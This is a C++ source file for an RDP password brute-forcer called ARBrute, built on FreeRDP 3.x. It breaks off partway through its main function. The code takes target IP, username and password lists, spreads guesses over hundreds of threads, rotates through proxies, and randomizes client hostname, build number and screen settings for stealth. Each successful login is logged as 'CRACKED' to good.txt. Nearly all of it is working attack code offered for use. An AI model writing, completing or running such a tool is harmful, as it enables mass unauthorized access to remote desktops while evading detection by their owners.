/**
 * ARBrute - FULL EDITION (750+ Lines)
 * Purpose: Maximum Stability + Stealth + Performance + All Features
 * Compatible: FreeRDP 3.x, MinGW-w64, Windows
 * Compile: g++ ARBrute.cpp -o ARBrute.exe -lws2_32 -lfreerdp3 -lfreerdp-client3 -lwinpr3 -lssl -lcrypto -lmmsystem -O3 -std=c++17 -march=native -mthreads -DNDEBUG -I/mingw64/include/freerdp3 -I/mingw64/include/winpr3 -I/mingw64/include -L/mingw64/lib
 * Slogan: Debian/NetBSD Level Stability ✓ | All Features Restored ✓
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

// ========== SYSTEM HEADERS ==========
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mmsystem.h>
#include <csignal>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <atomic>
#include <regex>
#include <chrono>
#include <random>
#include <iomanip>
#include <ctime>
#include <cmath>
#include <queue>
#include <map>
#include <set>
#include <algorithm>
#include <sstream>
#include <cstring>
#include <cstdlib>

// ========== FREE RDP 3.x HEADERS ==========
#include <freerdp/freerdp.h>
#include <freerdp/settings.h>
#include <freerdp/error.h>
#include <freerdp/utils/signal.h>

// ========== LINKER FLAGS ==========
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winmm.lib")

// ========== PROXY TYPE DEFINITIONS ==========
#define PROXY_TYPE_NONE     0
#define PROXY_TYPE_HTTP     1
#define PROXY_TYPE_SOCKS4   2
#define PROXY_TYPE_SOCKS5   3

// ========== VERSION INFO ==========
#define ARBRUTE_VERSION "3.0-FULL"
#define ARBRUTE_BUILD "2026.03.11"

// ========== CONFIGURATION STRUCT ==========
struct Config {
    // Threading
    int threads = 128;
    int max_threads = 512;
    int min_threads = 8;
    
    // Network
    int timeout_ms = 5000;
    int connect_timeout_ms = 3000;
    int max_retries = 2;
    int retry_backoff_ms = 200;
    int max_backoff_ms = 5000;
    
    // Circuit Breaker
    int circuit_threshold = 200;
    int circuit_reset_sec = 60;
    int circuit_pause_sec = 10;
    
    // Monitoring
    int health_interval_sec = 30;
    int status_interval_ms = 1000;
    int log_flush_interval_ms = 500;
    
    // Features
    bool use_proxy = false;
    bool randomize_identity = true;
    bool enable_watchdog = true;
    bool enable_circuit_breaker = true;
    bool enable_health_monitor = true;
    bool enable_status_bar = true;
    bool immediate_hit_flush = true;
    
    // Files
    std::string targets_file;
    std::string users_file;
    std::string pass_file;
    std::string proxy_file;
    std::string output_file = "good.txt";
    std::string log_file = "debug.log";
    std::string stats_file = "stats.json";
    
    // Identity Randomization Ranges
    struct IdentityRanges {
        int hostname_len_min = 8, hostname_len_max = 12;
        int build_min = 19000, build_max = 22650;
        std::vector<int> widths = {1920,1366,1536,1440,1280,1024};
        std::vector<int> heights = {1080,768,864,900,720,600};
        std::vector<uint32_t> kb_layouts = {0x00000409,0x0000040C,0x00000407,0x0000040A,0x0000040E};
    } identity_ranges;
};
Config cfg;

// ========== GLOBAL STATE (All Atomic for Thread Safety) ==========
std::atomic<uint64_t> stats_checked{0}, stats_cracked{0}, stats_failed{0}, stats_errors{0}, stats_timeouts{0};
std::atomic<int> active_threads{0}, hung_threads{0}, paused_threads{0};
std::atomic<bool> g_running{true}, g_paused{false}, g_shutdown{false};
std::atomic<time_t> last_health_report{0}, start_time{0}, last_stats_save{0};

// Mutexes for thread-safe operations
std::mutex cout_mtx, file_mtx, stats_mtx;

// ========== SAFE LOGGER (Thread-Safe, Buffered + Immediate Flush Option) ==========
class SafeLogger {
    std::ofstream dbg, hits, stats;
    std::mutex mtx;
    std::atomic<bool> write_failed{false};
    std::atomic<time_t> last_flush{0};
    bool immediate_flush;
    
public:
    SafeLogger(const std::string& debug_path, const std::string& hits_path, const std::string& stats_path, bool imm_flush = true) 
        : immediate_flush(imm_flush) {
        dbg.open(debug_path, std::ios::app);
        hits.open(hits_path, std::ios::app | std::ios::binary);
        stats.open(stats_path, std::ios::app);
        log_dbg("=== ARBrute Logger Initialized v" + std::string(ARBRUTE_VERSION) + " ===");
        log_dbg("Build: " + std::string(ARBRUTE_BUILD));
    }
    
    void log_dbg(const std::string& msg) {
        if (write_failed.load(std::memory_order_relaxed)) return;
        std::lock_guard<std::mutex> lock(mtx);
        if (dbg.is_open()) {
            auto now = std::chrono::system_clock::now();
            auto time = std::chrono::system_clock::to_time_t(now);
            auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
            dbg << "[" << std::put_time(std::localtime(&time), "%H:%M:%S") 
                << "." << std::setfill('0') << std::setw(3) << ms.count() << "] " 
                << msg << "\n";
            dbg.flush();
            if (dbg.fail()) {
                write_failed.store(true, std::memory_order_relaxed);
                std::cerr << "[LOGGER ERROR] Failed to write to debug log!\n";
            }
        }
    }
    
    void log_hit(const std::string& data) {
        if (write_failed.load(std::memory_order_relaxed)) return;
        std::lock_guard<std::mutex> lock(mtx);
        if (hits.is_open()) {
            hits << data << "\n";
            if (immediate_flush) hits.flush();  // Immediate write for critical hits
            if (hits.fail()) {
                write_failed.store(true, std::memory_order_relaxed);
                log_dbg("ERROR: Failed to write hit to file!");
            }
        }
    }
    
    void log_stats(const std::string& json_stats) {
        if (write_failed.load(std::memory_order_relaxed)) return;
        std::lock_guard<std::mutex> lock(mtx);
        if (stats.is_open()) {
            stats << json_stats << "\n";
            stats.flush();
        }
    }
    
    bool is_ok() const { return !write_failed.load(std::memory_order_relaxed); }
    
    ~SafeLogger() {
        if (dbg.is_open()) { dbg.flush(); dbg.close(); }
        if (hits.is_open()) { hits.flush(); hits.close(); }
        if (stats.is_open()) { stats.flush(); stats.close(); }
    }
};
SafeLogger* g_log = nullptr;

// ========== CRASH HANDLERS (Signal + Structured Exception via try/catch) ==========
void signal_handler(int sig) {
    if (g_log) g_log->log_dbg(">>> SIGNAL CAUGHT: " + std::to_string(sig) + " - Initiating graceful shutdown...");
    g_running.store(false, std::memory_order_release);
    g_shutdown.store(true, std::memory_order_release);
    
    // Give threads time to cleanup (max 5 seconds)
    for (int i = 0; i < 10 && active_threads.load() > 0; i++) {
        Sleep(500);
    }
    
    std::cerr << "\n[SHUTDOWN] Emergency shutdown complete. Press Enter to exit.\n";
    exit(128 + sig);
}

void install_crash_handlers() {
    signal(SIGSEGV, signal_handler);  // Segmentation fault
    signal(SIGABRT, signal_handler);  // Abort
    signal(SIGINT, signal_handler);   // Ctrl+C
    signal(SIGTERM, signal_handler);  // Termination request
#ifdef SIGPIPE
    signal(SIGPIPE, SIG_IGN);         // Ignore broken pipe (Unix)
#endif
#ifdef SIGILL
    signal(SIGILL, signal_handler);   // Illegal instruction
#endif
}

// ========== THREAD WATCHDOG (Detect Hung Threads) ==========
struct ThreadWatchdog {
    std::atomic<time_t> last_heartbeat;
    std::atomic<bool> is_active{true};
    int thread_id;
    std::string task_info;  // For debugging
    
    ThreadWatchdog(int id) : thread_id(id) { 
        last_heartbeat.store(time(nullptr), std::memory_order_relaxed); 
    }
    
    void heartbeat() { 
        last_heartbeat.store(time(nullptr), std::memory_order_relaxed); 
    }
    
    void set_task(const std::string& info) {
        task_info = info;
    }
    
    bool is_hung(int timeout_sec = 15) const {
        if (!is_active.load(std::memory_order_relaxed)) return false;
        time_t now = time(nullptr);
        time_t last = last_heartbeat.load(std::memory_order_relaxed);
        return (now - last) > timeout_sec;
    }
    
    void mark_inactive() { is_active.store(false, std::memory_order_relaxed); }
};

// ========== PROXY STRUCT ==========
struct ProxyInfo {
    int type;  // PROXY_TYPE_*
    std::string host;
    int port;
    std::string auth_user, auth_pass;  // Optional proxy auth
    
    bool valid() const { return !host.empty() && port > 0 && port < 65536; }
};

// ========== CIRCUIT BREAKER (Prevent Error Floods) ==========
class CircuitBreaker {
    std::atomic<int> error_count{0};
    std::atomic<time_t> last_error_time{0};
    std::atomic<bool> is_open{false};
    int threshold;
    int reset_seconds;
    int pause_seconds;
    
public:
    CircuitBreaker(int thresh, int reset, int pause) 
        : threshold(thresh), reset_seconds(reset), pause_seconds(pause) {}
    
    void record_error() { 
        error_count.fetch_add(1, std::memory_order_relaxed); 
        last_error_time.store(time(nullptr), std::memory_order_relaxed);
    }
    
    bool should_pause() const {
        if (!is_open.load(std::memory_order_relaxed)) {
            time_t now = time(nullptr);
            time_t last = last_error_time.load(std::memory_order_relaxed);
            int errors = error_count.load(std::memory_order_relaxed);
            
            // Reset counter if enough time passed without errors
            if (now - last > reset_seconds) {
                const_cast<CircuitBreaker*>(this)->error_count.store(0, std::memory_order_relaxed);
                return false;
            }
            // Open circuit if threshold exceeded
            if (errors > threshold) {
                const_cast<CircuitBreaker*>(this)->is_open.store(true, std::memory_order_relaxed);
                return true;
            }
        }
        return is_open.load(std::memory_order_relaxed);
    }
    
    void reset() { 
        error_count.store(0, std::memory_order_relaxed); 
        is_open.store(false, std::memory_order_relaxed);
    }
    
    bool is_open_state() const { return is_open.load(std::memory_order_relaxed); }
};
CircuitBreaker g_circuit(200, 60, 10);

// ========== THREAD-LOCAL RNG (Fast & Lock-Free Random Generation) ==========
struct ThreadRNG {
    std::mt19937_64 engine;
    std::uniform_int_distribution<int> dist_char;
    std::uniform_int_distribution<int> dist_digit;
    
    ThreadRNG() {
        std::random_device rd;
        // Seed with combination of random_device, thread_id, and time for uniqueness
        engine.seed(rd() ^ std::hash<std::thread::id>{}(std::this_thread::get_id()) ^ time(nullptr) ^ reinterpret_cast<uintptr_t>(this));
        dist_char = std::uniform_int_distribution<int>(65, 90);  // A-Z
        dist_digit = std::uniform_int_distribution<int>(0, 9);    // 0-9
    }
    
    std::string random_string(int len, bool alphanumeric = false) {
        std::string s; s.reserve(len);
        for (int i = 0; i < len; i++) {
            if (alphanumeric && dist_digit(engine) > 4) {
                s += (char)dist_char(engine);
            } else {
                s += '0' + dist_digit(engine);
            }
        }
        return s;
    }
    
    int random_int(int min, int max) { 
        std::uniform_int_distribution<int> d(min, max); 
        return d(engine); 
    }
    
    int random_from_vector(const std::vector<int>& vec) {
        if (vec.empty()) return 0;
        std::uniform_int_distribution<size_t> d(0, vec.size() - 1);
        return vec[d(engine)];
    }
};

ThreadRNG& get_rng() { 
    thread_local static ThreadRNG rng; 
    return rng; 
}

// ========== IDENTITY RANDOMIZER (STEALTH - Full Implementation) ==========
void randomize_client_settings(rdpSettings* settings) {
    if (!cfg.randomize_identity || !settings) return;
    
    ThreadRNG& rng = get_rng();
    
    // 1. Random Client Hostname (DESKTOP-XXXXXXXX format)
    int hlen = rng.random_int(cfg.identity_ranges.hostname_len_min, cfg.identity_ranges.hostname_len_max);
    std::string hostname = "DESKTOP-" + rng.random_string(hlen);
    freerdp_settings_set_string(settings, FreeRDP_ClientHostname, hostname.c_str());
    
    // 2. Random Client Build Number (Windows version simulation)
    uint32_t build = rng.random_int(cfg.identity_ranges.build_min, cfg.identity_ranges.build_max);
    freerdp_settings_set_uint32(settings, FreeRDP_ClientBuild, build);
    
    // 3. Random Screen Resolution
    int w = cfg.identity_ranges.widths[rng.random_int(0, (int)cfg.identity_ranges.widths.size() - 1)];
    int h = cfg.identity_ranges.heights[rng.random_int(0, (int)cfg.identity_ranges.heights.size() - 1)];
    freerdp_settings_set_uint32(settings, FreeRDP_DesktopWidth, w);
    freerdp_settings_set_uint32(settings, FreeRDP_DesktopHeight, h);
    
    // 4. Random Keyboard Layout
    uint32_t kb = cfg.identity_ranges.kb_layouts[rng.random_int(0, (int)cfg.identity_ranges.kb_layouts.size() - 1)];
    freerdp_settings_set_uint32(settings, FreeRDP_KeyboardLayout, kb);
    
    // 5. Random Color Depth (16/24/32 bpp)
    int depths[] = {16, 24, 32};
    freerdp_settings_set_uint32(settings, FreeRDP_ColorDepth, depths[rng.random_int(0, 2)]);
    
    // 6. Random Client Name
    std::string client_name = "ARBRUTE-" + rng.random_string(6, true);
    freerdp_settings_set_string(settings, FreeRDP_ClientHostname, client_name.c_str());
}

// ========== SAFE DATA LOADER (With Empty Password Support) ==========
std::vector<std::string> load_string_list_safe(const std::string& path, const std::string& label, bool allow_empty = false) {
    std::vector<std::string> list;
    std::ifstream f(path);
    
    if (!f) {
        if (g_log) g_log->log_dbg("Warning: Could not open " + label + " file: " + path);
        return list;
    }
    
    std::string line;
    int valid_count = 0, skipped = 0;
    
    while (std::getline(f, line)) {
        // Handle Windows line endings
        if (!line.empty() && line.back() == '\r') line.pop_back();
        
        if (!allow_empty) {
            // For IPs and Users: Trim and skip empty/comment lines
            auto start = line.find_first_not_of(" \t");
            if (start == std::string::npos) { skipped++; continue; }
            auto end = line.find_last_not_of(" \t");
            line = line.substr(start, end - start + 1);
        }
        // For passwords with allow_empty: keep empty strings but still skip comments
        
        if (!line.empty() && line[0] == '#') { skipped++; continue; }
        
        if (allow_empty || !line.empty()) {
            list.push_back(std::move(line));
            valid_count++;
        } else {
            skipped++;
        }
    }
    
    if (g_log) {
        std::string msg = "Loaded " + std::to_string(valid_count) + " " + label;
        if (allow_empty) msg += " (incl. " + std::to_string(skipped) + " empty)";
        g_log->log_dbg(msg);
    }
    return list;
}

std::vector<ProxyInfo> load_proxies_safe(const std::string& path) {
    std::vector<ProxyInfo> list;
    std::ifstream f(path);
    if (!f) return list;
    
    // Regex for: protocol://host:port or protocol://user:pass@host:port
    std::regex re_basic(R"(^(http|socks4|socks5)://([^:]+):(\d+)$)");
    std::regex re_auth(R"(^(http|socks4|socks5)://([^:]+):([^@]+)@([^:]+):(\d+)$)");
    
    std::string line;
    while (std::getline(f, line)) {
        if (!line.empty() && line.back() == '\r') line.pop_back();
        if (line.empty() || line[0] == '#') continue;
        
        try {
            std::smatch m;
            ProxyInfo p;
            
            if (std::regex_match(line, m, re_auth)) {
                // Proxy with auth: protocol://user:pass@host:port
                p.type = (m[1] == "http") ? PROXY_TYPE_HTTP : (m[1] == "socks4") ? PROXY_TYPE_SOCKS4 : PROXY_TYPE_SOCKS5;
                p.auth_user = m[2];
                p.auth_pass = m[3];
                p.host = m[4];
                p.port = std::stoi(m[5]);
            } else if (std::regex_match(line, m, re_basic)) {
                // Basic proxy: protocol://host:port
                p.type = (m[1] == "http") ? PROXY_TYPE_HTTP : (m[1] == "socks4") ? PROXY_TYPE_SOCKS4 : PROXY_TYPE_SOCKS5;
                p.host = m[2];
                p.port = std::stoi(m[3]);
            } else {
                continue; // Skip malformed lines
            }
            
            if (p.valid()) list.push_back(p);
        } catch (...) {
            continue; // Skip parsing errors
        }
    }
    return list;
}

// ========== TARGET STRUCT ==========
struct Target {
    std::string ip;
    int port;
    
    Target() : port(3389) {}
    Target(std::string i, int p) : ip(std::move(i)), port(p) {}
    
    bool valid() const { return !ip.empty() && port > 0 && port < 65536; }
};

// ========== CORE AUTH FUNCTION ==========
// ========== CORE AUTH FUNCTION (Fixed - No FFmpeg Required) ==========
// ========== CORE AUTH FUNCTION (FreeRDP 3.x Fixed) ==========
bool attempt_rdp_auth_safe(const std::string& ip, int port,
                           const std::string& user, const std::string& pass,
                           const ProxyInfo* proxy, ThreadWatchdog& wd) {
    wd.heartbeat();
    wd.set_task(ip + ":" + std::to_string(port) + " | " + user);
    
    freerdp* instance = nullptr;
    bool success = false;
    
    for (int retry = 0; retry < cfg.max_retries && g_running.load() && !g_paused.load(); retry++) {
        if (retry > 0) {
            int delay = std::min(cfg.retry_backoff_ms * (1 << (retry-1)), cfg.max_backoff_ms);
            Sleep(delay);
        }
        
        wd.heartbeat();
        
        if (cfg.enable_circuit_breaker && g_circuit.should_pause()) {
            g_paused.store(true);
            Sleep(cfg.circuit_pause_sec * 1000);
            g_paused.store(false);
            g_circuit.reset();
        }
        
        if (!g_running.load()) break;
        
        try {
            instance = freerdp_new();
            if (!instance) { g_circuit.record_error(); continue; }
            
            if (!freerdp_context_new(instance)) {
                freerdp_free(instance); instance = nullptr;
                g_circuit.record_error(); continue;
            }
            
            rdpContext* context = instance->context;
            if (!context) {
                freerdp_context_free(instance); freerdp_free(instance);
                instance = nullptr; g_circuit.record_error(); continue;
            }
            
            rdpSettings* settings = context->settings;
            if (!settings) {
                freerdp_context_free(instance); freerdp_free(instance);
                instance = nullptr; g_circuit.record_error(); continue;
            }
            
            // Basic Settings
            freerdp_settings_set_string(settings, FreeRDP_ServerHostname, ip.c_str());
            freerdp_settings_set_uint32(settings, FreeRDP_ServerPort, port);
            freerdp_settings_set_string(settings, FreeRDP_Username, user.c_str());
            freerdp_settings_set_string(settings, FreeRDP_Password, pass.c_str());
            
            // Security & Performance
            freerdp_settings_set_bool(settings, FreeRDP_AuthenticationOnly, true);
            freerdp_settings_set_bool(settings, FreeRDP_IgnoreCertificate, true);
            freerdp_settings_set_uint32(settings, FreeRDP_TcpConnectTimeout, cfg.timeout_ms);
            freerdp_settings_set_bool(settings, FreeRDP_RdpSecurity, true);
            freerdp_settings_set_bool(settings, FreeRDP_TlsSecurity, true);
            freerdp_settings_set_bool(settings, FreeRDP_NlaSecurity, true);
            
            // Disable heavy features (only valid constants)
            freerdp_settings_set_bool(settings, FreeRDP_AudioPlayback, false);
            freerdp_settings_set_bool(settings, FreeRDP_DeviceRedirection, false);
            freerdp_settings_set_bool(settings, FreeRDP_CompressionEnabled, false);
            freerdp_settings_set_bool(settings, FreeRDP_SupportDynamicChannels, false);
            freerdp_settings_set_bool(settings, FreeRDP_FastPathOutput, true);
            freerdp_settings_set_bool(settings, FreeRDP_FastPathInput, true);
            
            // Graphics (minimal)
            freerdp_settings_set_uint32(settings, FreeRDP_ColorDepth, 16);
            freerdp_settings_set_bool(settings, FreeRDP_GfxH264, false);
            freerdp_settings_set_bool(settings, FreeRDP_GfxAVC444, false);
            freerdp_settings_set_bool(settings, FreeRDP_RemoteFxCodec, false);
            
            // Identity Randomization
            randomize_client_settings(settings);
            
            // Proxy
            if (proxy && cfg.use_proxy && proxy->valid()) {
                freerdp_settings_set_uint32(settings, FreeRDP_ProxyType, proxy->type);
                freerdp_settings_set_string(settings, FreeRDP_ProxyHostname, proxy->host.c_str());
                freerdp_settings_set_uint16(settings, FreeRDP_ProxyPort, static_cast<uint16_t>(proxy->port));
            }
            
            wd.heartbeat();
            
            auto t0 = std::chrono::steady_clock::now();
            bool connected = freerdp_connect(instance);
            auto t1 = std::chrono::steady_clock::now();
            auto dur = std::chrono::duration_cast<std::chrono::milliseconds>(t1-t0).count();
            
            if (dur > cfg.timeout_ms * 3) {
                freerdp_abort_connect_context(context);
                g_circuit.record_error();
                stats_timeouts.fetch_add(1);
                continue;
            }
            
            if (connected) {
                success = true;
                freerdp_disconnect(instance);
                break;
            } else {
                g_circuit.record_error();
            }
            
        } catch (const std::exception& e) {
            g_circuit.record_error();
        } catch (...) {
            g_circuit.record_error();
        }
        
        if (instance) {
            try { freerdp_context_free(instance); } catch(...) {}
            freerdp_free(instance);
            instance = nullptr;
        }
    }
    
    if (instance) {
        try { freerdp_context_free(instance); } catch(...) {}
        freerdp_free(instance);
    }
    
    wd.heartbeat();
    return success;
}

// ========== WORKER THREAD (Lock-Free Task Distribution + Full Features) ==========
void worker_thread(
    const std::vector<Target>& targets,
    const std::vector<std::string>& users,
    const std::vector<std::string>& passwords,
    const std::vector<ProxyInfo>* proxies,
    std::atomic<uint64_t>& task_idx,
    uint64_t total_tasks,
    int thread_id) {
    
    active_threads.fetch_add(1, std::memory_order_relaxed);
    ThreadWatchdog wd(thread_id);
    
    // Cache sizes for fast math (avoid repeated .size() calls)
    const size_t t_count = targets.size();
    const size_t u_count = users.size();
    const size_t p_count = passwords.size();
    const uint64_t up_product = (uint64_t)u_count * p_count;
    
    if (g_log) g_log->log_dbg("Worker " + std::to_string(thread_id) + " started");
    
    while (g_running.load(std::memory_order_acquire) && !g_paused.load(std::memory_order_acquire)) {
        // Lock-free task acquisition using atomic fetch_add
        uint64_t idx = task_idx.fetch_add(1, std::memory_order_relaxed);
        if (idx >= total_tasks) break;
        
        // 🧮 DECODE: Convert flat index to (ip, user, pass) indices
        // idx = (ip_idx * up_product) + (user_idx * p_count) + pass_idx
        size_t ip_idx = static_cast<size_t>(idx / up_product);
        uint64_t remainder = idx % up_product;
        size_t user_idx = static_cast<size_t>(remainder / p_count);
        size_t pass_idx = static_cast<size_t>(remainder % p_count);
        
        // Bounds check (defensive programming)
        if (ip_idx >= t_count || user_idx >= u_count || pass_idx >= p_count) {
            stats_errors.fetch_add(1, std::memory_order_relaxed);
            continue;
        }
        
        // Get actual values by reference (zero copy)
        const Target& target = targets[ip_idx];
        const std::string& user = users[user_idx];
        const std::string& pass = passwords[pass_idx];  // Can be empty string
        
        // Deterministic proxy selection based on task index
        ProxyInfo* proxy = nullptr;
        if (cfg.use_proxy && proxies && !proxies->empty()) {
            size_t px_idx = idx % proxies->size();
            proxy = const_cast<ProxyInfo*>(&(*proxies)[px_idx]);
        }
        
        wd.heartbeat();
        wd.set_task(target.ip + ":" + std::to_string(target.port) + " | " + user);
        
        try {
            bool result = attempt_rdp_auth_safe(target.ip, target.port, user, pass, proxy, wd);
            stats_checked.fetch_add(1, std::memory_order_relaxed);
            
            if (result) {
                stats_cracked.fetch_add(1, std::memory_order_relaxed);
                
                // Format result log
                std::string log = target.ip + ":" + std::to_string(target.port) + " | " + user + ":" + pass;
                if (proxy && proxy->valid()) {
                    log += " [PROXY:" + proxy->host + ":" + std::to_string(proxy->port) + "]";
                }
                
                // IMMEDIATE HIT LOGGING (critical for not losing results)
                if (g_log) g_log->log_hit(log);
                
                // Console notification (with mutex to prevent garbled output)
                {
                    std::lock_guard<std::mutex> lock(cout_mtx);
                    std::cout << "\r[+] CRACKED: " << target.ip << " | " << user << ":" << pass << "   ";
                    std::cout.flush();
                }
            } else {
                stats_failed.fetch_add(1, std::memory_order_relaxed);
            }
        } catch (const std::exception& e) {
            if (g_log) g_log->log_dbg("Worker " + std::to_string(thread_id) + " exception: " + std::string(e.what()));
            stats_errors.fetch_add(1, std::memory_order_relaxed);
        } catch (...) {
            stats_errors.fetch_add(1, std::memory_order_relaxed);
        }
        
        // Periodic health report per thread
        static thread_local auto last_report = std::chrono::steady_clock::now();
        auto now = std::chrono::steady_clock::now();
        if (now - last_report > std::chrono::seconds(60)) {
            last_report = now;
            if (g_log) {
                g_log->log_dbg("Thread " + std::to_string(thread_id) + " @ task " + std::to_string(idx) + 
                              " | Checked: " + std::to_string(stats_checked.load()));
            }
        }
    }
    
    wd.mark_inactive();
    active_threads.fetch_sub(1, std::memory_order_relaxed);
    if (g_log) g_log->log_dbg("Worker " + std::to_string(thread_id) + " exited cleanly");
}

// ========== HEALTH MONITOR THREAD ==========
void health_monitor(const std::vector<ThreadWatchdog*>& watchdogs) {
    while (g_running.load(std::memory_order_acquire)) {
        Sleep(cfg.health_interval_sec * 1000);
        
        // Check for hung threads
        int hung = 0;
        for (auto* wd : watchdogs) {
            if (wd && cfg.enable_watchdog && wd->is_hung(cfg.timeout_ms / 1000 * 3)) {
                hung++;
                if (g_log) g_log->log_dbg("⚠️  WARNING: Thread " + std::to_string(wd->thread_id) + 
                                         " appears hung (task: " + wd->task_info + ")");
            }
        }
        hung_threads.store(hung, std::memory_order_relaxed);
        
        // Memory usage check (Windows API)
        MEMORYSTATUSEX statex = {sizeof(statex)};
        if (GlobalMemoryStatusEx(&statex)) {
            double mem_usage = 100.0 - (statex.ullAvailPhys * 100.0 / statex.ullTotalPhys);
            if (mem_usage > 85 && g_log) {
                g_log->log_dbg("⚠️  WARNING: Memory usage at " + std::to_string((int)mem_usage) + "%");
            }
        }
        
        // Connection stats summary
        if (g_log && cfg.enable_health_monitor) {
            g_log->log_dbg("📊 HEALTH: Threads=" + std::to_string(active_threads.load()) + 
                          " | Checked=" + std::to_string(stats_checked.load()) +
                          " | Cracked=" + std::to_string(stats_cracked.load()) +
                          " | Errors=" + std::to_string(stats_errors.load()) +
                          " | Hung=" + std::to_string(hung) +
                          " | Circuit=" + std::string(g_circuit.is_open_state() ? "OPEN" : "CLOSED"));
        }
        
        // Save stats periodically
        time_t now = time(nullptr);
        if (now - last_stats_save.load() > 300) {  // Every 5 minutes
            last_stats_save.store(now);
            if (g_log) {
                std::ostringstream json;
                json << "{\"ts\":" << now 
                     << ",\"checked\":" << stats_checked.load()
                     << ",\"cracked\":" << stats_cracked.load()
                     << ",\"failed\":" << stats_failed.load()
                     << ",\"errors\":" << stats_errors.load()
                     << ",\"threads\":" << active_threads.load() << "}";
                g_log->log_stats(json.str());
            }
        }
    }
}

// ========== STATUS BAR THREAD (Live Console Output) ==========
void status_bar_thread() {
    auto last_display = std::chrono::steady_clock::now();
    
    while (g_running.load(std::memory_order_acquire)) {
        auto now = std::chrono::steady_clock::now();
        if (now - last_display < std::chrono::milliseconds(cfg.status_interval_ms)) {
            Sleep(100);
            continue;
        }
        last_display = now;
        
        time_t now_time = time(nullptr);
        time_t start = start_time.load(std::memory_order_relaxed);
        double elapsed = (now_time - start) > 0 ? (now_time - start) : 1;
        
        uint64_t checked = stats_checked.load(std::memory_order_relaxed);
        uint64_t cracked = stats_cracked.load(std::memory_order_relaxed);
        uint64_t failed = stats_failed.load(std::memory_order_relaxed);
        uint64_t errors = stats_errors.load(std::memory_order_relaxed);
        uint64_t timeouts = stats_timeouts.load(std::memory_order_relaxed);
        
        double pps = checked / elapsed;
        double cps = cracked / elapsed;  // Cracks per second
        
        {
            std::lock_guard<std::mutex> lock(cout_mtx);
            std::cout << "\r[STATUS] PPS:" << std::setw(6) << (int)pps
                      << " CPS:" << std::setw(4) << (int)cps
                      << " | Checked:" << std::setw(12) << checked
                      << " | Cracked:" << std::setw(8) << cracked
                      << " | Failed:" << std::setw(10) << failed
                      << " | Errors:" << std::setw(8) << errors
                      << " | TO:" << std::setw(6) << timeouts
                      << " | Threads:" << std::setw(4) << active_threads.load()
                      << (g_paused.load(std::memory_order_acquire) ? " [⏸️ PAUSED]" : "        ")
                      << (g_circuit.is_open_state() ? " [🔌 OPEN]" : "      ")
                      << "   ";
            std::cout.flush();
        }
    }
}

// ========== JSON STATS EXPORT ==========
void export_stats_json(const std::string& filename) {
    std::ofstream f(filename);
    if (!f) return;
    
    time_t now = time(nullptr);
    time_t start = start_time.load();
    double elapsed = (now - start) > 0 ? (now - start) : 1;
    
    f << "{\n";
    f << "  \"timestamp\": " << now << ",\n";
    f << "  \"version\": \"" << ARBRUTE_VERSION << "\",\n";
    f << "  \"duration_sec\": " << (int)elapsed << ",\n";
    f << "  \"stats\": {\n";
    f << "    \"checked\": " << stats_checked.load() << ",\n";
    f << "    \"cracked\": " << stats_cracked.load() << ",\n";
    f << "    \"failed\": " << stats_failed.load() << ",\n";
    f << "    \"errors\": " << stats_errors.load() << ",\n";
    f << "    \"timeouts\": " << stats_timeouts.load() << "\n";
    f << "  },\n";
    f << "  \"rates\": {\n";
    f << "    \"pps\": " << std::fixed << std::setprecision(2) << (stats_checked.load()/elapsed) << ",\n";
    f << "    \"cps\": " << std::fixed << std::setprecision(2) << (stats_cracked.load()/elapsed) << "\n";
    f << "  }\n";
    f << "}\n";
}

// ========== MAIN ENTRY POINT ==========
int main() {
    install_crash_handlers();
    
    // Suppress FreeRDP logs
    _putenv("WLOG_LEVEL=OFF");
    _putenv("WLOG_APPENDER=none");
    // Install crash handlers FIRST (before anything else)
    install_crash_handlers();
	SetConsoleOutputCP(CP_UTF8);
    
    // Initialize Winsock (required for network operations on Windows)
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "FATAL: WSAStartup failed - network initialization error\n";
        return 1;
    }
    
    // Improve timer resolution for more accurate Sleep() calls
    timeBeginPeriod(1);
    start_time.store(time(nullptr), std::memory_order_relaxed);
    
    // Banner
    std::cout << "╔════════════════════════════════════════════════════╗\n";
    std::cout << "║     ARBrute - FULL EDITION v" << ARBRUTE_VERSION << "                  ║\n";
    std::cout << "║     Build: " << ARBRUTE_BUILD << "                         ║\n";
    std::cout << "║   Stability: Debian/NetBSD Level | FreeRDP 3.x     ║\n";
    std::cout << "║   Features: Stealth + EmptyPass + Proxy + Monitor  ║\n";
    std::cout << "╚════════════════════════════════════════════════════╝\n\n";
    
    // Get file inputs from user
    std::cout << "📁 Targets file (IPs): ";
    if (!(std::cin >> cfg.targets_file)) { std::cerr << "Input error\n"; return 1; }
    
    std::cout << "👤 Users file: ";
    if (!(std::cin >> cfg.users_file)) { std::cerr << "Input error\n"; return 1; }
    
    std::cout << "🔑 Passwords file: ";
    if (!(std::cin >> cfg.pass_file)) { std::cerr << "Input error\n"; return 1; }
    
    // Proxy option
    char pc;
    std::cout << "🌐 Use proxy list? (y/n): ";
    std::cin >> pc;
    if (pc == 'y' || pc == 'Y') {
        cfg.use_proxy = true;
        std::cout << "📦 Proxy file: ";
        if (!(std::cin >> cfg.proxy_file)) { std::cerr << "Input error\n"; return 1; }
    }
    
    // Thread count
    std::string t;
    std::cout << "🧵 Thread count [" << cfg.threads << "]: ";
    std::cin >> t;
    if (!t.empty()) {
        try { 
            cfg.threads = std::stoi(t);
            if (cfg.threads < cfg.min_threads) cfg.threads = cfg.min_threads;
            if (cfg.threads > cfg.max_threads) cfg.threads = cfg.max_threads;
        } catch (...) { std::cerr << "Invalid, using default\n"; }
    }
    
    // Timeout
    std::string to;
    std::cout << "⏱️  Timeout ms [" << cfg.timeout_ms << "]: ";
    std::cin >> to;
    if (!to.empty()) {
        try { cfg.timeout_ms = std::stoi(to); }
        catch (...) { std::cerr << "Invalid, using default\n"; }
    }
    
    // Feature toggles
    std::cout << "\n⚙️  Feature Toggles:\n";
    std::cout << "  - Identity Randomization: " << (cfg.randomize_identity ? "ON" : "OFF") << "\n";
    std::cout << "  - Circuit Breaker: " << (cfg.enable_circuit_breaker ? "ON" : "OFF") << "\n";
